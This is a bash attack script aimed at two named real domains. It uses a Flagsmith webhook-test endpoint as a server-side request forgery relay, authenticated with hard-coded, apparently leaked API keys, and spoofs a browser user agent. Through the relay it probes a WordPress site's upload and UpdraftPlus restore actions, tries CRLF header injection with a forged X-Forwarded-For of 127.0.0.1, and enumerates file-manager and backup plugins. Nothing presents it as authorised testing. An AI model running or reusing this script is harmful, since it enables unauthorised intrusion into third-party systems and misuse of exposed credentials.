#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="52345f7dcce985368c2efdbb96648f4e0da25a40"
EKEY="XmdKkEuf4ysw9pmxoLw9vc"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Verify API works
echo "=== VERIFY ==="
curl -s "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | head -c 100
echo ""

# Test 1: WP REST API root (discover namespaces and routes)
echo "=== WP REST ROOT ==="
SSRF "https://koinp2p.com/?rest_route=/"
echo ""

# Test 2: WP admin-ajax async-upload
echo "=== ASYNC UPLOAD ==="
SSRF "https://koinp2p.com/wp-admin/async-upload.php"
echo ""

# Test 3: UpdraftPlus restore chain
echo "=== UPDRAFT RESTORE ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore"
echo ""

# Test 4: plupload (UpdraftPlus file upload without nonce)
echo "=== PLUPLOAD ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=plupload_action"
echo ""

# Test 5: WP admin-post (generic POST handler)
echo "=== ADMIN POST ==="
SSRF "https://koinp2p.com/wp-admin/admin-post.php"
echo ""

# Test 6: koinp2p with CRLF in URL to inject headers
echo "=== CRLF INJECT ==="
SSRF "https://koinp2p.com/%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a"
echo ""

# Test 7: koinp2p wp-content/plugins for more plugins
echo "=== MORE PLUGINS ==="
for plugin in "wp-file-manager" "file-manager" "wp-filemanager" "elfinder" "wp-database-backup" "duplicator" "backwpup" "woocommerce"; do
  echo -n "$plugin -> "
  SSRF "https://koinp2p.com/wp-content/plugins/${plugin}/readme.txt"
  echo ""
done
